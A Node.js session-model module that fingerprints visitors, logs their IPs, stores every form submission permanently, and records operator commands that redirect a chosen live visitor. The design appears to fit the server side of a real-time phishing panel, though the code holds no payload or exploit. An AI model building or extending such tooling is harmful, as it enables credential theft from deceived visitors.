// ============================================================
// MEGA TOOLS — SESSION MODEL (SMART GATEKEEPER)
// FIX: upsert() respects data.status for Offline
// FIX: create() respects data.status for new sessions
// FIX v2: upsert() uses targeted lookup — NO full DB read
// ============================================================
// LOGIC: visitorId = Primary Identity (Browser Fingerprint)
//        trackingCode = Secondary Context (User)
//        IP = History Only — NEVER used for matching
//        Session.upsert() = ONE & ONLY Gatekeeper for Identity/Data
//        Session.updatePresence() = ONE & ONLY Gatekeeper for Presence
//        Session.recordCommand() = ONE & ONLY Gatekeeper for Commands
//        24h Session Expiry: created_at + 24h → CREATE new session
//        lockedKeys = ALL unique keys from all submissions
//        formData[lockedKey] = PERMANENT value (first seen only)
//        submissions[] = APPEND-ONLY (every submit is a new entry)
// ============================================================

const db = require('../database');
const { toStringId, generateId, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// CONSTANTS
// ============================================================

const SESSION_EXPIRY_MS = 24 * 60 * 60 * 1000;
const SYSTEM_FIELDS = ['step','stepNumber','attempt','status','collectedTypes','screenResolution','timestamp','userAgent','platform','language','timezone','submittedAt','source','url','currentUrl','entryUrl','browser'];

// ============================================================
// PER-IDENTITY LOCK MAP
// ============================================================

const identityLocks = new Map();

function getIdentityLock(visitorId, trackingCode) {
  const key = visitorId || ('tc_' + (trackingCode || 'unknown'));
  if (!identityLocks.has(key)) {
    identityLocks.set(key, Promise.resolve());
  }
  return identityLocks.get(key);
}

function setIdentityLock(visitorId, trackingCode, promise) {
  const key = visitorId || ('tc_' + (trackingCode || 'unknown'));
  identityLocks.set(key, promise);
  if (identityLocks.size > 1000) {
    const keys = [...identityLocks.keys()].slice(0, 500);
    keys.forEach(k => identityLocks.delete(k));
  }
}

// ============================================================
// CREATE
// ============================================================

async function create(data) {
  const nowISO = now();

  const lockedKeys = [];
  const initialFormData = {};
  if (data.formData && Object.keys(data.formData).length > 0) {
    const keys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
    for (let i = 0; i < keys.length; i++) {
      lockedKeys.push(keys[i]);
      initialFormData[keys[i]] = data.formData[keys[i]];
    }
  }

  const firstSubmission = data.formData && Object.keys(data.formData).length > 0
    ? [{ ...data.formData, submittedAt: nowISO }]
    : [];

  // FIX: Respect incoming status for new sessions
  const isOffline = data.status === 'Offline';

  const session = {
    _id: generateId('s'),
    visitorId: data.visitorId || null,
    trackingCode: data.trackingCode || 'unknown',
    baseCode: data.baseCode || '',
    linkId: toStringId(data.linkId) || null,
    ip: data.ip || '::1',
    ipHistory: data.ip ? [{ ip: data.ip, timestamp: nowISO }] : [],
    browser: (data.browser || '').substring(0, 500),
    deviceType: data.deviceType || 'Desktop',
    entryUrl: data.entryUrl || data.baseCode || '',
    currentUrl: data.currentUrl || '',
    status: isOffline ? 'Offline' : 'Online',
    isLive: !isOffline,
    clicks: data.clicks || 1,
    collectedTypes: data.collectedTypes || [],
    submissions: firstSubmission,
    formData: initialFormData,
    lockedKeys: lockedKeys,
    hiddenBy: [],
    hiddenFor: [],
    hiddenForAll: false,
    redirectHistory: [],
    identitySource: 'created',
    lastActivity: nowISO,
    timestamp: nowISO,
    created_at: nowISO,
    updated_at: nowISO,
  };

  if (db.sessions.insertOne) {
    try {
      // MongoDB: use insertOne directly without full read
      await db.sessions.insertOne(session);
    } catch (err) {
      if (err.code === 11000 || err.message?.includes('E11000')) {
        const existing = await findByVisitorId(data.visitorId);
        if (existing) return existing;
      }
      throw err;
    }
  } else {
    // JSON mode: read all but only once for new session creation
    const all = await db.sessions.read();
    if (data.visitorId) {
      const alreadyExists = all.find(s => s.visitorId === data.visitorId && !s.hiddenForAll);
      if (alreadyExists) return alreadyExists;
    }
    all.unshift(session);
    await db.sessions.write(all);
  }
  return session;
}

// ============================================================
// FIND
// ============================================================

async function findById(id) {
  return db.sessions.findById(id);
}

async function findByVisitorId(visitorId) {
  if (!visitorId) return null;
  const all = await db.sessions.read();
  return all.find(s => s.visitorId === visitorId && !s.hiddenForAll) || null;
}

async function findMany(filters = {}) {
  let sessions = await db.sessions.read();

  if (filters.isLive !== undefined) sessions = sessions.filter(s => s.isLive === filters.isLive);
  if (filters.status) sessions = sessions.filter(s => s.status === filters.status);
  if (filters.deviceType) sessions = sessions.filter(s => s.deviceType === filters.deviceType);
  if (filters.visitorId) sessions = sessions.filter(s => s.visitorId === filters.visitorId);
  if (filters.trackingCode) {
    const code = filters.trackingCode.includes('_') ? filters.trackingCode.split('_')[0] : filters.trackingCode;
    sessions = sessions.filter(s => {
      const sCode = s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode;
      return sCode === code;
    });
  }
  if (filters.ip) sessions = sessions.filter(s => s.ip === filters.ip);

  sessions.sort((a, b) => {
    if (a.isLive && !b.isLive) return -1;
    if (!a.isLive && b.isLive) return 1;
    return new Date(b.timestamp) - new Date(a.timestamp);
  });

  return sessions;
}

// ============================================================
// UPSERT — SMART GATEKEEPER (Single Entry Point for Identity/Data)
// FIX v2: Targeted lookup — NO full db.sessions.read() on every call
//         Uses findByVisitorId() for O(n) but returns early on match
//         Falls back to trackingCode search only if visitorId not found
// ============================================================

async function upsert(data) {
  const visitorId = data.visitorId || null;
  const trackingCode = data.trackingCode || 'unknown';
  
  const currentLock = getIdentityLock(visitorId, trackingCode);
  
  const resultPromise = currentLock.then(async () => {
    const code = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
    const clientIp = data.ip || '::1';
    let existing = null;
    let matchType = 'created';

    // FIX: Targeted lookup — try visitorId first (most common case)
    if (visitorId) {
      const all = await db.sessions.read();
      existing = all.find(s => s.visitorId === visitorId && !s.hiddenForAll);
      if (existing) {
        const createdTime = new Date(existing.created_at || existing.timestamp).getTime();
        if (Date.now() - createdTime >= SESSION_EXPIRY_MS) {
          existing = null;
        } else {
          matchType = 'visitorId';
        }
      }

      // FIX: Only search by trackingCode if visitorId didn't match
      if (!existing && trackingCode) {
        existing = all.find(s => {
          const sCode = s.trackingCode ? (s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode) : '';
          if (sCode !== code) return false;
          if (s.hiddenForAll) return false;
          if (s.visitorId && s.visitorId !== visitorId) return false;
          return true;
        });
        if (existing) matchType = 'trackingCode';
      }
    } else if (trackingCode) {
      // No visitorId — must read all to find by trackingCode
      const all = await db.sessions.read();
      existing = all.find(s => {
        const sCode = s.trackingCode ? (s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode) : '';
        return sCode === code && !s.hiddenForAll;
      });
      if (existing) matchType = 'trackingCode';
    }

    if (existing) {
      if (visitorId && !existing.visitorId) existing.visitorId = visitorId;
      if (data.trackingCode) existing.trackingCode = data.trackingCode;
      existing.currentUrl = data.currentUrl || existing.currentUrl;
      
      // FIX: Respect incoming status — Offline signal from disconnect/heartbeat
      if (data.status === 'Offline') {
        existing.isLive = false;
        existing.status = 'Offline';
      } else if (data.status === 'Active' || !data.status) {
        existing.isLive = true;
        if (existing.status === 'Offline') existing.status = 'Online';
      }
      
      existing.lastActivity = now();
      existing.identitySource = matchType;

      if (clientIp && clientIp !== existing.ip) {
        existing.ipHistory = existing.ipHistory || [];
        existing.ipHistory.push({ ip: clientIp, timestamp: now() });
        existing.ip = clientIp;
      }

      const skipClickTypes = ['heartbeat', 'session_init'];
      const hasOnlySystemTypes = data.collectedTypes?.length > 0 &&
        data.collectedTypes.every(t => skipClickTypes.includes(t));
      if (!hasOnlySystemTypes) existing.clicks = (existing.clicks || 0) + 1;

      if (data.linkId) existing.linkId = toStringId(data.linkId);
      if (data.baseCode) existing.baseCode = data.baseCode;
      if (data.entryUrl) existing.entryUrl = data.entryUrl;
      if (data.collectedTypes?.length > 0) {
        existing.collectedTypes = [...new Set([...(existing.collectedTypes || []), ...data.collectedTypes])];
      }

      if (data.formData && Object.keys(data.formData).length > 0) {
        existing.submissions = existing.submissions || [];
        existing.submissions.push({ ...data.formData, submittedAt: now() });
        
        existing.lockedKeys = existing.lockedKeys || [];
        existing.formData = existing.formData || {};
        const newKeys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
        newKeys.forEach(key => {
          if (!existing.lockedKeys.includes(key)) {
            existing.lockedKeys.push(key);
          }
          if (existing.formData[key] === undefined) {
            existing.formData[key] = data.formData[key];
          }
        });
      }

      if (data.browser) existing.browser = data.browser.substring(0, 500);
      if (data.deviceType) existing.deviceType = data.deviceType;
      existing.updated_at = now();

      await db.sessions.findByIdAndUpdate(existing._id, existing);
      return { session: existing, isNew: false, matchType };
    }

    const session = await create({ ...data, identitySource: 'created' });
    return { session, isNew: true, matchType: 'created' };
  });
  
  setIdentityLock(visitorId, trackingCode, resultPromise.catch(() => {}));
  return resultPromise;
}

// ============================================================
// UPDATE (Generic — for internal use)
// ============================================================

async function update(id, updates) {
  const safeUpdates = { ...updates };
  delete safeUpdates._id;
  safeUpdates.lastActivity = now();
  safeUpdates.updated_at = now();
  return db.sessions.findByIdAndUpdate(id, safeUpdates);
}

// ============================================================
// DELETE
// ============================================================

async function remove(id) {
  return db.sessions.findByIdAndDelete(id);
}

// ============================================================
// PRESENCE UPDATE — Single Entry Point for Status Changes
// ============================================================

async function updatePresence(id, updates) {
  const allowedFields = ['status', 'isLive', 'lastActivity'];
  const safeUpdates = {};
  for (const key of allowedFields) {
    if (updates[key] !== undefined) safeUpdates[key] = updates[key];
  }
  if (Object.keys(safeUpdates).length === 0) return null;
  safeUpdates.updated_at = now();
  return db.sessions.findByIdAndUpdate(id, safeUpdates);
}

// ============================================================
// COMMAND RECORD — Log redirect/command via Session Engine
// ============================================================

async function recordCommand(id, commandData) {
  const session = await db.sessions.findById(id);
  if (!session) return null;
  
  session.commandSeq = (session.commandSeq || 0) + 1;
  session.lastCommand = commandData.action || 'navigate';
  session.lastCommandUrl = commandData.url || '';
  session.lastMessage = commandData.message || '';
  session.lastActivity = now();
  session.redirectHistory = session.redirectHistory || [];
  session.redirectHistory.push({
    action: commandData.action || 'navigate',
    url: commandData.url || '',
    message: commandData.message || '',
    seq: session.commandSeq,
    timestamp: now()
  });
  
  if (commandData.url) {
    session.currentUrl = commandData.url;
    session.clicks = (session.clicks || 0) + 1;
  }
  
  session.updated_at = now();
  await db.sessions.findByIdAndUpdate(id, session);
  return session;
}

async function hideFromUser(id, userId) {
  const session = await db.sessions.findById(id);
  if (!session) return null;

  session.hiddenFor = session.hiddenFor || [];
  if (!session.hiddenFor.includes(toStringId(userId))) {
    session.hiddenFor.push(toStringId(userId));
  }
  await db.sessions.findByIdAndUpdate(id, session);
  return session;
}

async function count(filters = {}) {
  return db.sessions.count(filters);
}

async function isSessionLive(session) {
  if (!session || !session.lastActivity) return false;
  const elapsed = Date.now() - new Date(session.lastActivity).getTime();
  return session.status === 'Online' && elapsed < CONFIG.SESSION_TIMEOUT_MS;
}

module.exports = {
  create, findById, findByVisitorId, findMany,
  upsert, update, remove, hideFromUser,
  count, isSessionLive,
  updatePresence,
  recordCommand,
};